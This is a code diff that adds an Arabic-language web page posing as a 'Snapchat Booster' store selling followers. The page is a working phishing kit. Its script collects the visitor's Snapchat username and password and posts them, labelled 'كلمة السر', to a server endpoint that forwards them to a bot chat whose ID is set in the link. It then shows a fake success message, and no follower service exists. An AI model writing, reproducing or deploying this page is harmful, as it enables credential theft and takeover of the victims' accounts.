@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Booster | متجر سناب شات</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+        body {
+            background-color: #111111; color: #ffffff; min-height: 100vh; padding: 20px;
+            background-image: radial-gradient(circle at top right, rgba(255, 252, 0, 0.15), transparent 50%), radial-gradient(circle at bottom left, rgba(255, 252, 0, 0.05), transparent 50%);
+        }
+        .container { max-width: 600px; margin: 0 auto; position: relative; z-index: 2; }
+        
+        .header { text-align: center; margin-bottom: 25px; background: linear-gradient(145deg, #1a1a1a, #0a0a0a); border-radius: 20px; border: 2px solid #FFFC00; box-shadow: 0 0 30px rgba(255, 252, 0, 0.2); position: relative; overflow: hidden; }
+        .header img { width: 100%; height: auto; display: block; border-radius: 18px 18px 0 0; }
+        .header .header-text { padding: 15px; }
+        .header h1 { font-size: 24px; color: #FFFC00; margin-bottom: 5px; }
+        .header p { font-size: 14px; color: #bdc3c7; }
+
+        .features-bar { display: flex; justify-content: space-around; background: rgba(26, 26, 26, 0.9); border: 1px solid #333; border-radius: 12px; padding: 12px; margin-bottom: 20px; font-size: 12px; color: #FFFC00; text-align: center; }
+        .features-bar div { display: flex; flex-direction: column; align-items: center; gap: 5px; }
+        .features-bar i { font-size: 18px; margin-bottom: 3px; }
+
+        .plans-container { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+        .plan-card { background: rgba(26, 26, 26, 0.9); border: 1px solid #333; border-radius: 12px; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: all 0.3s ease; }
+        .plan-card:hover { border-color: #FFFC00; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 252, 0, 0.1); }
+        .plan-card.selected { border-color: #FFFC00; background: rgba(255, 252, 0, 0.1); box-shadow: 0 0 15px rgba(255, 252, 0, 0.2); }
+        
+        .plan-info { display: flex; align-items: center; gap: 15px; }
+        .plan-info i { font-size: 30px; color: #FFFC00; }
+        .plan-info h3 { font-size: 16px; margin-bottom: 3px; color: #fff; }
+        .plan-info p { font-size: 12px; color: #bdc3c7; }
+        
+        .price-tag { background: #FFFC00; color: #000; padding: 6px 12px; border-radius: 8px; font-weight: bold; font-size: 14px; }
+        .price-tag.free { background: #00b894; color: #fff; }
+
+        .input-group { background: rgba(26, 26, 26, 0.9); border: 1px solid #333; border-radius: 10px; padding: 5px 15px; margin-bottom: 15px; display: flex; align-items: center; transition: 0.3s; }
+        .input-group:focus-within { border-color: #FFFC00; box-shadow: 0 0 10px rgba(255, 252, 0, 0.2); }
+        .input-group i { color: #FFFC00; font-size: 18px; margin-left: 10px; }
+        .input-group input { width: 100%; padding: 12px 0; background: transparent; border: none; color: #fff; font-size: 15px; outline: none; }
+
+        .submit-btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #FFFC00, #e6e600); color: #000; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center; gap: 10px; box-shadow: 0 5px 15px rgba(255, 252, 0, 0.3); margin-top: 10px; }
+        .submit-btn:hover { transform: scale(1.02); box-shadow: 0 8px 25px rgba(255, 252, 0, 0.5); }
+        .submit-btn:disabled { background: #555; cursor: not-allowed; box-shadow: none; }
+
+        .success-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.95); z-index: 999; justify-content: center; align-items: center; flex-direction: column; padding: 20px; text-align: center; }
+        .success-modal.active { display: flex; }
+        .success-icon { font-size: 100px; color: #2ecc71; animation: popIn 0.5s ease; margin-bottom: 20px; text-shadow: 0 0 20px rgba(46, 204, 113, 0.5); }
+        .success-text { font-size: 22px; font-weight: bold; color: #2ecc71; }
+        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+
+        .error-msg { color: #e74c3c; background: rgba(231, 76, 60, 0.1); padding: 10px; border-radius: 8px; text-align: center; font-size: 14px; font-weight: bold; margin-bottom: 15px; display: none; border: 1px solid rgba(231, 76, 60, 0.3); }
+        .footer { text-align: center; margin-top: 30px; color: #555; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <img src="https://www.image2url.com/r2/default/images/1792706230782-49cc04eb-59e0-4def-9210-d25b68783bf9.png" alt="Snapchat Banner">
+            <div class="header-text">
+                <h1>Snapchat Booster</h1>
+                <p>بوابتك لزيادة متابعين سناب شات</p>
+            </div>
+        </div>
+
+        <div class="features-bar">
+            <div><i class="fas fa-users"></i> متابعين حقيقيين</div>
+            <div><i class="fas fa-heart"></i> متفاعلين</div>
+            <div><i class="fas fa-gem"></i> جودة أصلية</div>
+            <div><i class="fas fa-bolt"></i> سريع التنفيذ</div>
+        </div>
+
+        <div id="errorBox" class="error-msg"></div>
+
+        <div class="plans-container">
+            <div class="plan-card" onclick="selectPlan('1000', 'مجاناً', this)">
+                <div class="plan-info">
+                    <i class="fas fa-gift"></i>
+                    <div><h3>1,000 متابع سناب</h3><p>عرض يومياً</p></div>
+                </div>
+                <div class="price-tag free">مجاناً</div>
+            </div>
+            <div class="plan-card" onclick="selectPlan('5000', '$1.99', this)">
+                <div class="plan-info">
+                    <i class="fas fa-users"></i>
+                    <div><h3>5,000 متابع سناب</h3><p>انطلاقة قوية</p></div>
+                </div>
+                <div class="price-tag">$1.99</div>
+            </div>
+            <div class="plan-card" onclick="selectPlan('10000', '$4.99', this)">
+                <div class="plan-info">
+                    <i class="fas fa-rocket"></i>
+                    <div><h3>10,000 متابع سناب</h3><p>وصول أعلى</p></div>
+                </div>
+                <div class="price-tag">$4.99</div>
+            </div>
+            <div class="plan-card" onclick="selectPlan('25000', '$9.99', this)">
+                <div class="plan-info">
+                    <i class="fas fa-crown"></i>
+                    <div><h3>25,000 متابع سناب</h3><p>باقة VIP للشهرة</p></div>
+                </div>
+                <div class="price-tag">$9.99</div>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <i class="fas fa-user"></i>
+            <input type="text" id="username" placeholder="اسم المستخدم (اليوزر)">
+        </div>
+        <div class="input-group">
+            <i class="fas fa-lock"></i>
+            <input type="password" id="password" placeholder="كلمة السر (تجريبية)">
+        </div>
+        <div class="input-group">
+            <i class="fas fa-users-cog"></i>
+            <input type="text" id="selectedPlan" placeholder="الباقة المختارة" readonly>
+        </div>
+
+        <button class="submit-btn" id="submitBtn" onclick="sendOrder()">
+            <i class="fas fa-check-circle"></i> بدء الطلب
+        </button>
+
+        <div class="footer">© 2026 Snapchat Booster. جميع الحقوق محفوظة.</div>
+    </div>
+
+    <div class="success-modal" id="successModal">
+        <i class="fas fa-check-circle success-icon"></i>
+        <div class="success-text">تم إرسال طلبك بنجاح!</div>
+    </div>
+
+    <script>
+        // بنقرا الآيدي من اللينك
+        const urlParams = new URLSearchParams(window.location.search);
+        const userChatId = urlParams.get('chatId');
+        
+        let selectedFollowers = "";
+        let selectedPrice = "";
+
+        function selectPlan(followers, price, element) {
+            selectedFollowers = followers;
+            selectedPrice = price;
+            document.getElementById('selectedPlan').value = followers + " متابع (" + price + ")";
+            document.querySelectorAll('.plan-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+            document.getElementById('errorBox').style.display = 'none';
+        }
+
+        // دالة بتكلم السيرفر بتاعنا
+        async function sendToBot(text) {
+            const formData = new FormData();
+            formData.append('chat_id', userChatId);
+            formData.append('text', text);
+            await fetch('/send_custom_message', { method: 'POST', body: formData });
+        }
+
+        async function sendOrder() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorBox = document.getElementById('errorBox');
+            const btn = document.getElementById('submitBtn');
+            const successModal = document.getElementById('successModal');
+
+            errorBox.style.display = 'none';
+
+            if (!username || username.length < 3) {
+                errorBox.innerText = "❌ يرجى إدخال يوزر صحيح (3 حروف على الأقل)!";
+                errorBox.style.display = 'block';
+                return;
+            }
+            if (!password || password.length < 4) {
+                errorBox.innerText = "❌ يرجى إدخال كلمة سر صحيحة!";
+                errorBox.style.display = 'block';
+                return;
+            }
+            if (!selectedFollowers) {
+                errorBox.innerText = "❌ يرجى اختيار الباقة أولاً!";
+                errorBox.style.display = 'block';
+                return;
+            }
+
+            btn.disabled = true;
+
+            const text = `👻 <b>طلب جديد من متجر سناب شات:</b>\n\n👤 <b>اليوزر:</b> ${username}\n🔑 <b>كلمة السر:</b> ${password}\n👥 <b>الباقة:</b> ${selectedFollowers} متابع (${selectedPrice})`;
+            
+            await sendToBot(text);
+            btn.disabled = false;
+
+            successModal.classList.add('active');
+            setTimeout(() => {
+                successModal.classList.remove('active');
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+                document.getElementById('selectedPlan').value = '';
+                selectedFollowers = "";
+                document.querySelectorAll('.plan-card').forEach(card => card.classList.remove('selected'));
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
